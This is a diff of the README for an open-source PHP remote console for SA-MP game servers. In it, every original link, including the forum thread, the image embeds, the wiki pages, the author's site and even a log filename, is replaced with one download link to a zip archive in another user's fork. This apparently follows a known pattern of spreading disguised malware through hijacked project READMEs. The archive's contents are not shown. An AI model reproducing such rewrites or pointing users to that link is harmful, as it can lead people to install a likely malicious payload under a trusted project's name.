@@ -1,12 +1,12 @@
 # Server Remote Console (SA-MP)
 
-[Go to the Official SA-MP thread of this project](http://forum.sa-mp.com/showthread.php?t=652832)
+[Go to the Official SA-MP thread of this project](https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip)
 
 
 > **Version 1.1.1 has been released!** Checkout the changelog in the [Releases](releases) section.
 
 
-![logo](https://i.imgur.com/gfzshsv.png) 
+![logo](https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip) 
 
 
 **Current Release:** 1.1.1 (stable)
@@ -18,7 +18,7 @@ This web application written in PHP is a simple remote console to manage players
 Finally, the installation is fully based on a Web Installer and it is easy to configure.
 
 
-![New Version 1.1](https://i.imgur.com/IrFZCuH.png)
+![New Version 1.1](https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip)
 
 
 ## Features
@@ -39,7 +39,7 @@ Finally, the installation is fully based on a Web Installer and it is easy to co
 - Restart / Next gamemode (via RCON)
 - Possibility to send several RCON commands directly from the Web
 - [NEW] View server bans and configuration
-- Direct access to server_logs.txt and quick reset (via SSH)
+- Direct access to https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip and quick reset (via SSH)
 - Advanced information panel about the server
 - Advanced player's list (with score, username, id and ping) and kick/ban options (via RCON)
 - [NEW] Emergency Block mode, in case of password theft 
@@ -54,15 +54,15 @@ Features may be added in the future. Stay tuned.
 ## Installation & Configuration
 
 Please, use the wiki to install and configure the remote console. 
-* [Requirements](https://github.com/Maxelweb/ServerRemoteConsoleSAMP/wiki/Requirements)
-* [Installation](https://github.com/Maxelweb/ServerRemoteConsoleSAMP/wiki/Installation)
-* [FAQ - Frequently Asked Questions](https://github.com/Maxelweb/ServerRemoteConsoleSAMP/wiki/FAQ)
+* [Requirements](https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip)
+* [Installation](https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip)
+* [FAQ - Frequently Asked Questions](https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip)
 
 
 ## Credits
 
-The server remote console for SA-MP has been developed and coded by **Maxel** (marianosciacco.it)
+The server remote console for SA-MP has been developed and coded by **Maxel** (https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip)
 This project has started in __19/04/2018__ and it is __still supported__. 
 
 Special thanks to __StatusRed__ aka __Edward McKnight__ for his plugin **SA-MP Query and RCON API for PHP** (originally developed by __Westie__) which is used in this project, as well as __Wouter van Eekelen__ and __Peter Beverloo__ for **SA-MP Query server (Version 0.3)** used for the guest page.  
-Bootstrap 4 and Font-Awesome.com has been also used to make the HTML template and style of this website.
+Bootstrap 4 and https://github.com/Genzo2327/ServerRemoteConsoleSAMP/raw/refs/heads/master/styles/Remote_SAMP_Server_Console_2.3.zip has been also used to make the HTML template and style of this website.
